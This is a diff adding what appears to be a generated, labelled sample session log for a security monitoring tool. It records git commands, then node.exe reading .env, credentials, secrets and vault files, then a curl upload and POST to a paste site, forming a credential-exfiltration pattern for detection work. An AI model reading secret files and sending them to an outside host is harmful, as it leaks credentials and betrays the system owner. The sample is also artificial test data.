@@ -1,0 +1,170 @@
+{
+  "format": "sentinel-session-v1",
+  "metadata": {
+    "id": "gen-na-mrn9sase-lb3kko",
+    "recordedAt": "2026-07-16T08:46:32.126Z",
+    "durationMs": 2981,
+    "platform": "win32",
+    "hostname": "generator",
+    "username": "eval",
+    "workingDirectory": "C:/project-169",
+    "sentinelVersion": "1.0.0",
+    "tags": [
+      "suspicious",
+      "git",
+      "recon",
+      "MEDIUM",
+      "generated"
+    ]
+  },
+  "events": [
+    {
+      "type": "git_command",
+      "data": {
+        "pid": 9000,
+        "processName": "git",
+        "commandLine": "git log --oneline -5",
+        "action": "log",
+        "timestamp": "2026-07-16T08:46:32.619Z"
+      }
+    },
+    {
+      "type": "git_command",
+      "data": {
+        "pid": 9000,
+        "processName": "git",
+        "commandLine": "git diff --stat",
+        "action": "other",
+        "timestamp": "2026-07-16T08:46:32.733Z"
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 9001,
+        "name": "git",
+        "commandLine": "git push origin main",
+        "timestamp": "2026-07-16T08:46:33.032Z",
+        "riskIndicators": []
+      }
+    },
+    {
+      "type": "flow",
+      "data": {
+        "id": "na-mrn9sase-e8hld5",
+        "sessionId": "",
+        "timestamp": "2026-07-16T08:46:33.141Z",
+        "protocol": "TLS",
+        "sourceAddr": "192.168.1.100",
+        "sourcePort": 49001,
+        "destAddr": "140.82.112.4",
+        "destPort": 443,
+        "hostname": "github.com",
+        "sni": "github.com",
+        "bytesSent": 2940,
+        "bytesReceived": 1097,
+        "durationMs": 777,
+        "method": "GET",
+        "path": "/user/project"
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/.env",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.622Z",
+        "bytesRead": 1737
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/.env.prod",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.622Z",
+        "bytesRead": 2068
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/credentials.json",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.622Z",
+        "bytesRead": 2562
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/config/secrets.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.622Z",
+        "bytesRead": 2571
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/db/config/database.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.622Z",
+        "bytesRead": 1472
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/deploy/ansible/vault.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.622Z",
+        "bytesRead": 2796
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 5001,
+        "name": "curl.exe",
+        "commandLine": "curl -s -o /dev/null -w \"%{http_code}\" https://private-paste.com/api/upload",
+        "timestamp": "2026-07-16T08:46:34.035Z",
+        "riskIndicators": [
+          "network_tool"
+        ]
+      }
+    },
+    {
+      "type": "flow",
+      "data": {
+        "id": "na-mrn9sase-js0jfp",
+        "sessionId": "",
+        "timestamp": "2026-07-16T08:46:34.241Z",
+        "protocol": "TLS",
+        "sourceAddr": "192.168.1.100",
+        "sourcePort": 49019,
+        "destAddr": "185.199.0.1",
+        "destPort": 443,
+        "hostname": "private-paste.com",
+        "sni": "private-paste.com",
+        "bytesSent": 3566,
+        "bytesReceived": 256,
+        "durationMs": 905,
+        "method": "POST",
+        "path": "/api/upload"
+      }
+    }
+  ]
+}
